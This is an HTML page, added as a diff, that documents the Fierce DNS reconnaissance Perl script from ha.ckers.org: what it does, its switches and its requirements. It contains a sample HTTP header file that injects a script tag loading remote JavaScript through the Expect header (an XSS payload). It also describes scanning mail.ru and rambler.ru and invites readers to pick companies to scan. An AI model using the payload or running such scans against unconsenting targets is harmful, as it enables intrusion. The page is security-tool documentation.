@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <title>fierce.pl history</title>
+</head>
+<body>
+<div id="content" class="widecolumn">
+    <div align="center"><h2>Fierce Domain Scan</h2>
+    </div>
+
+    <p>Written by RSnake with input from id, <a href="http://winfingerprint.com/">Vacuum</a> and <a href="http://www.dyadsecurity.com/">Robert E Lee</a>. A special thanks to IceShaman to porting it to use multi-threading.</p>
+
+    <p>Fierce has had a lot of publicity over the years.  But none so fun as seen on <a href="http://youtu.be/dU_hJscvdXU#t=2m3s">Scorpion</a> - a new show on CBS.</p>
+
+    <p>Fierce domain scan was born out of personal frustration after performing a web application security audit.  It is traditionally very difficult to discover large swaths of a corporate network that is non-contiguous.  It's terribly easy to run a scanner against an IP range, but if the IP ranges are nowhere near one another you can miss huge chunks of networks.</p>
+
+    <p>First what Fierce is not.  Fierce is not an IP scanner, it is not a DDoS tool, it is not designed to scan the whole internet or perform any un-targeted attacks. It is meant specifically to locate likely targets both inside and outside a corporate network.  Only those targets are listed (unless the -nopattern switch is used).  No exploitation is performed (unless you do something intentionally malicious with the -connect switch).  Fierce is a reconnaissance tool.  Fierce is a PERL script that quickly scans domains (usually in just a few minutes, assuming no network lag) using several tactics.</p>
+
+    <p>First it queries your DNS for the DNS servers of the target.  It then switches to using the target's DNS server (you can use a different one if you want using the -dnsserver switch but this can cause problems if the server you use won't tell you information about other people's sites and of course you won't find much relevant internal address space).  Fierce then attempts to dump the SOA records for the domain in the very slim hope that the DNS server that your target uses may be misconfigured.  Once that fails (because it almost always will) it attempts to "guess" names that are common amongst a lot of different companies.  Don't ask me where I got the list, it's just a list of names that id and I have seen all over the place.  I thought about adding a dictionary to this, but I think that would take a lot longer, and given that very few of the words are dictionary words I don't think this would add a lot of value.</p>
+
+    <p>Next, if it finds anything on any IP address it will scan up and down a set amount (default 5 but you can expand it with -traverse or increase it to the entire subnet with -wide) looking for anything else with the same domain name in it using reverse lookups.  If it finds anything on any of those it will recursively scan until it doesn't find any more.  In this way it ends up looping a lot, and the bigger the domain is the more you get back. The reason Fierce automatically switches to using the target's DNS server is so that it can probe the Intranet (RFC1918) of the target, assuming the target uses a single DNS server for both their Intranet and external sites.</p>
+
+    <p>I also added a random call to something that should fail to test for wildcard DNS.  If it's found, the wildcard is discarded to reduce erroneous results.  That doesn't speed up the scan because it still needs to check to see if the test resolves back to IP address that the wildcard is pointing to. However it does reduce false positives.</p>
+
+    <p>Also, I've added a "search" option that allows you to find other non-related domain names.  For example, let's say my target's domain is widget.com but I know they have email addresses like soandso@widgetcompany.com and own another company called nutsandbolts.com I can add search queries.  This won't scan for those domains, but if those names pop up, it won't ignore them.  Fierce will report on anything inside the search pattern as long as it matches.  If you want everything I guess you could put a,b,c,...,x,y,z but I'll probably make something in the future to allow for scanning/reporting the entire C block once anything is found in it that matches the DNS string.  Here's the syntax:</p>
+
+    <p><b>perl fierce.pl -dns widget.com -search widgetcompany,nutsandbolts</b></p>
+
+    <p>I also realized it can be a little bad about finding everything in a class C if the target used non-contiguous blocks within the class C.  To deal with that I built in a function to allow a scan (of only C blocks).  This is also really useful for scanning intranets if the DNS is poorly configured.  I might expand on this later.</p>
+
+    <p><b>perl fierce.pl -range 10.10.10.0-255 -dnsserver ns1.example.com</b></p>
+
+    <p>As an alternative, you can use the -wide switch which does a wide path of reverse lookups after finding any C names that match your query in the C block.  This provides a lot more information but is a lot more noisy.</p>
+
+    <p><b>perl fierce.pl -dns example.com -wide -file output.txt</b></p>
+
+    <p>Finally, for the web application security folks I added a command to connect to any http servers on port 80 and perform whatever action you put into a configuration file. This is really noisy and really slow (especially on large networks), so I wouldn't recommend trying it unless you have a few hours with nothing better to do, unless you know there are only a handful of machines or have already ran this without the connect scan turned on.</p>
+
+    <p><b>perl fierce.pl -dns example.com -connect headers.txt -fulloutput -file output.txt</b></p>
+
+    <p>Here's what a sample header file might look like.  The sample file below is attempting to exploit the <a href="http://ha.ckers.org/blog/20060731/expect-header-injection-via-flash/">Expect cross site scripting vulnerability</a>:</p>
+
+    <p><textarea  name="code" cols="55" rows="3">GET / HTTP/1.0 User-Agent: Mozilla/5.0
+                                    Host:
+                                    Expect: &lt;script src=http://ha.ckers.org/xss.js&gt;&lt;/script&gt;</textarea></p>
+
+    <p>Fierce also has wordlist support so that you can supply your own dictionary using the -wordlist keyword.  Since the brute force does rely on matching at least a few internal targets, this could be helpful if you know that the naming convention has to do with a certain non-obvious naming convention or uses another language, etc.</p>
+
+    <p><b>perl fierce.pl -dns example.com -wordlist dictionary.txt -file output.txt</b></p>
+
+    <p>Not convinced?  Prior to running the scan I had never been to either mail.ru or rambler.ru (a few of the top Alexa sites in Russia).  Since I don't read Russian, performing an audit against them is far more difficult.  Here's some sample output from the two.  In the first example you can see that mail.ru has a non-contiguous address for it's mobile.mail.ru than it does for the rest of the site.  That would have been very difficult to locate with any other scanner.  In the rambler.ru example you can see the RFC1918 space 10.* pop up:</p>
+
+    <ul>
+        <li><a HREF="http://ha.ckers.org/fierce/mail.ru">mail.ru</a> - 418 entries and 303 hostnames found.
+        <li><a HREF="http://ha.ckers.org/fierce/rambler.ru">rambler.ru</a> - 472 entries and 458 hostnames found.
+    </ul>
+
+    <p>Trust me, we've found far more interesting sites than these two in our tests, but I don't want to disparage any companies for their mistakes.  I'm sure you can think of a few companies to test this against.  The results can be pretty amazing.  If you don't get many results, that could be one of three things, 1) you aren't scanning their corporate domain, you are only scanning their external domain which they only have one or two machines on 2) it's a very small company or 3) you typo'd the domain name (I haven't built any checks to make sure the domain you entered is valid).</p>
+
+    <p>Requirements:  This is a PERL program requiring the PERL interpreter with the modules <a href="http://www.net-dns.org/">Net::DNS</a> and <a href="http://perldoc.perl.org/Net/hostent.html">Net::hostent</a>.  You can install modules using CPAN:</p>
+
+   <blockquote>perl -MCPAN -e 'install Net::DNS'<br>
+    perl -MCPAN -e 'install Net::hostent'</blockquote>
+
+    <p><b>Windows users</b>: You can use Fierce under Windows if you use <a href="http://www.cygwin.com/">Cygwin</a> with PERL and the above two modules installed.  I have not tested this using ActivePerl in Windows, so I would recommend Cygwin until ActivePerl can be thoroughly tested.  I am/was working on a win32 version of Fierce, but have put the project on hold.  If anyone is interested in picking up where I left off, drop <a href="http://ha.ckers.org/blog/about/">me</a> a line.</p>
+
+    <p>Version: Fierce is currently at version 0.9.9 - Beta 03/24/2007</p>
+
+    <p>Download: <a href="http://ha.ckers.org/fierce/fierce.pl">fierce.pl</a></p>
+
+    <p>Download: <a href="http://ha.ckers.org/fierce/hosts.txt">hosts.txt</a></p>
+
+    <p>(Thanks to Robert E Lee for the help with this and to Michael Thumann's <a href="http://www.ernw.de/en/eng_security_tools.html">DNSDigger</a> wordlist).</p>
+
+    <p>Getting started: <B>perl fierce.pl -help</B></p>
+
+    <p>This may some bugs in it. Also this can be a noisy scanner, but in the tests I've performed it's exceptionally effective at finding non-contiguous IP blocks and new attack points.  This should be considered a pre-cursor to <A HREF="/http://insecure.org/nmap/">nmap</A>, <A HREF="http://www.unicornscan.org/">unicornscan</A> or <A HREF="http://www.nessus.org/">nessus</A> as it gives you enough information to begin a much more thorough scan with one of those other tools.  Also, it can point out DNS entries for hosts that are no longer up or have not yet been put into production.  Please use Fierce with care and at your own risk.</p>
+
+    <br>
+    <br>
+
+</div>
+<hr />
+<br>
+<div id="footer">
+    <p>
+		<span>ha.ckers.org security lab is &copy; 2001-2015
+		<br /><a href="http://ha.ckers.org/blog/feed/">Entries (RSS)</a>
+		and <a href="http://ha.ckers.org/blog/comments/feed/">Comments (RSS)</a>.</span>
+    </p>
+</div>
+</body>
+</html>
